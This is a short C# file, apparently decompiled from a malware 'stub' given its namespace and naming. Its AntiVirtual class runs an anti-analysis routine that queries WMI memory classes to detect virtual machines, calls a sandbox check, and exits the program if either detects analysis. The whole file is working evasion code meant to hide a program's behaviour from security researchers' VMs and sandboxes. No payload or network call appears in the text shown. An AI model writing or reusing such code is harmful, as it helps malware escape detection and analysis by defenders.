using System;
using System.Management;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	internal class AntiVirtual
	{
		// Token: 0x0600000C RID: 12 RVA: 0x000020CE File Offset: 0x000002CE
		public static void RunAntiAnalysis()
		{
			if (AntiVirtual.isVM_by_wim_temper() || AntiVirtual.isVM_by_wim_temper1() || AntiSandBox.Check())
			{
				Methods.Exit();
			}
		}
		public static bool isVM_by_wim_temper()
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new SelectQuery("Select * from Win32_CacheMemory"));
			return managementObjectSearcher.Get().Count == 0;
		}
		public static bool isVM_by_wim_temper1()
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new SelectQuery("Select * from CIM_Memory"));
			return managementObjectSearcher.Get().Count == 0;
		}
	}
}
